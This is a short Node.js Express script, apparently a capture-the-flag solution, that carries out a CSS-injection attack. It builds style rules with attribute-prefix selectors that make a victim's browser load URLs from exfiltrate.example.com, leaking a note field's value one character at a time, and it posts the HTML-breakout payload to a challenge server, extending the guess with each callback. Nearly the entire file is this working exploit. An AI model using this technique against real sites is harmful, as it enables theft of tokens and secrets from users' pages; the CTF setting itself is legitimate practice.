const express = require("express");
const router = express.Router();

const app = express();

app.use(express.urlencoded({ extended: true }));
// app.use(express.json());

app.use((req, res, next) => {
  res.setHeader("Cache-Control", "no-cache, no-store, must-revalidate");
//   res.setHeader("Pragma", "no-cache");
  res.setHeader("Expires", "0");
  next();
});

let flag = `Flag: pwnEd`;

router.get('/', (req, res) => {
  if (req.query.char) {
    flag += req.query.char;
  }
  console.log(flag);
  const possibleChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_{}";
  let style = '';
  for (let i = 0; i < possibleChars.length; i++) {
    style += `#myNote[value^="${flag + possibleChars[i]}"] { background: url("https://exfiltrate.example.com/?char=${possibleChars[i]}"); }`; // TODO: encode the chars in query string
  }
  let payload = `"><style>${style}</style><img src="`;
  // console.log(payload);
  fetch(`http://thisnote.challenges.sigint.mx/`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      note: payload,
    }),
  });
  res.send('');
});

app.use(router);

app.listen(3000, "0.0.0.0", async () => {
  console.log(`Listening on port 3000`);
});
